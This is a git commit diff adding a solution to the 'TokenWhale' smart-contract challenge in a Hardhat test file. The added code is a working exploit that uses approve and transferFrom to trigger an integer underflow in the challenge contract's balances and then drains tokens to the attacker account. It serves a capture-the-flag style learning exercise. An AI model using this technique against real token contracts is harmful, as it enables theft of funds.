55e30a15284da27002f662fd041d4a935439e722
Kristians Kuhta <kristians-kuhta@users.noreply.github.com>
2023-04-25 20:32:27 +0300

    Add solution for token whale challenge

--- test/11-TokenWhale.test.ts
+++ test/11-TokenWhale.test.ts
@@ -7,9 +7,11 @@ describe('TokenWhaleChallenge', () => {
   let target: Contract;
   let attacker: SignerWithAddress;
   let deployer: SignerWithAddress;
+  let firstAccount: SignerWithAddress;
+  let secondAccount: SignerWithAddress;
 
   before(async () => {
-    [attacker, deployer] = await ethers.getSigners();
+    [attacker, deployer, firstAccount, secondAccount] = await ethers.getSigners();
 
     target = await (
       await ethers.getContractFactory('TokenWhaleChallenge', deployer)
@@ -21,9 +23,14 @@ describe('TokenWhaleChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const approveTx = await target.approve(firstAccount.address, 1000);
+    await approveTx.wait();
+
+    const transferTx = await target.connect(firstAccount).transferFrom(attacker.address, secondAccount.address, 1000);
+    await transferTx.wait();
+
+    // NOTE: 2000000 is just a random number to satisfy the isComplete
+    await target.connect(firstAccount).transfer(attacker.address, '2000000');
 
     expect(await target.isComplete()).to.equal(true);
   });
